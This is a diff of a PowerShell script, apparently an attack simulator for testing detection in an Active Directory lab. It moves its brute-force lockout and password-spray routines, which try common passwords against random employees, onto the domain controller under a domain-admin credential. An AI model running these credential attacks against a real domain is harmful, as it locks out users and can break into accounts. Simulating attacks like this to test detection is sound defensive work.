@@ -883,14 +883,15 @@ Function Invoke-AttackAction {
         [string]$attackAction
     )
 
-    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+    # build DA credential the same way all other action functions do
+    $accountDomainAdmin = ($actionAccounts | Where-Object { $_.ID -eq "domainadmin" }).AccountName
+    $domainAdminCredential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $accountDomainAdmin, $passwordSecure
 
     switch ($attackAction) {
 
         #bruteForce - hammers 1 random employee with repeated bad-password auth attempts
         #             intended to trigger account lockout and brute force IRP indicators
-        #             uses LDAP ValidateCredentials to ensure auth events are generated
-        #             regardless of whether the script is running as DA on the DC
+        #             runs on the DC via DA credential to ensure auth events land in AD
         bruteForce {
             $targetUser = $null
             try {
@@ -908,17 +909,18 @@ Function Invoke-AttackAction {
 
             Write-Host "      ! bruteForce: targeting $targetUser with 50 bad-password attempts"
 
-            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
-                [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domainSuffix
-            )
-
-            1..50 | ForEach-Object {
-                try {
-                    $ctx.ValidateCredentials($targetUser, "WrongPassword!$_") | Out-Null
-                } catch { }
-            }
-
-            $ctx.Dispose()
+            Invoke-Command -ComputerName $dcName -ErrorAction Stop -Credential $domainAdminCredential `
+                -ArgumentList $targetUser, $domainSuffix -ScriptBlock {
+                    param($user, $domain)
+                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+                    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
+                        [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain
+                    )
+                    1..50 | ForEach-Object {
+                        try { $ctx.ValidateCredentials($user, "WrongPassword!$_") | Out-Null } catch { }
+                    }
+                    $ctx.Dispose()
+                }
 
             $status = Get-ADUser -Identity $targetUser -Properties LockedOut, BadLogonCount, LastBadPasswordAttempt -ErrorAction SilentlyContinue
             if ($null -ne $status) {
@@ -926,10 +928,10 @@ Function Invoke-AttackAction {
             }
         }
 
-        #passwordSpray - attempts several bad passwords across 5 random employees
+        #passwordSpray - attempts several common passwords across 5 random employees
         #                intended to trigger password spray IRP indicator
-        #                uses LDAP ValidateCredentials to ensure auth events are generated
-        #                pattern: few passwords, many users (inverse of brute force)
+        #                runs on the DC via DA credential to ensure auth events land in AD
+        #                pattern: rotate passwords across users (not many attempts per user)
         passwordSpray {
             $targetUsers = $null
             try {
@@ -945,25 +947,27 @@ Function Invoke-AttackAction {
                 return
             }
 
-            # A small pool of common-looking passwords to spray - wrong for all accounts
             $sprayPasswords = @("Summer2024!", "Welcome1!", "Password1!", "Spring2024!")
+            $targetSAMs = $targetUsers.SamAccountName
 
-            Write-Host "      ! passwordSpray: spraying $($targetUsers.Count) accounts with $($sprayPasswords.Count) passwords"
+            Write-Host "      ! passwordSpray: spraying $($targetSAMs.Count) accounts with $($sprayPasswords.Count) passwords"
+            Write-Host "        ~ targets: $($targetSAMs -join ', ')"
 
-            $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
-                [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domainSuffix
-            )
-
-            foreach ($sprayPassword in $sprayPasswords) {
-                foreach ($user in $targetUsers) {
-                    Write-Host "        ~ spraying: $($user.SamAccountName)"
-                    try {
-                        $ctx.ValidateCredentials($user.SamAccountName, $sprayPassword) | Out-Null
-                    } catch { }
+            Invoke-Command -ComputerName $dcName -ErrorAction Stop -Credential $domainAdminCredential `
+                -ArgumentList $targetSAMs, $sprayPasswords, $domainSuffix -ScriptBlock {
+                    param($users, $passwords, $domain)
+                    Add-Type -AssemblyName System.DirectoryServices.AccountManagement
+                    $ctx = New-Object System.DirectoryServices.AccountManagement.PrincipalContext(
+                        [System.DirectoryServices.AccountManagement.ContextType]::Domain, $domain
+                    )
+                    foreach ($password in $passwords) {
+                        foreach ($user in $users) {
+                            try { $ctx.ValidateCredentials($user, $password) | Out-Null } catch { }
+                        }
+                    }
+                    $ctx.Dispose()
                 }
-            }
 
-            $ctx.Dispose()
             Write-Host "      ! passwordSpray: complete"
         }
 
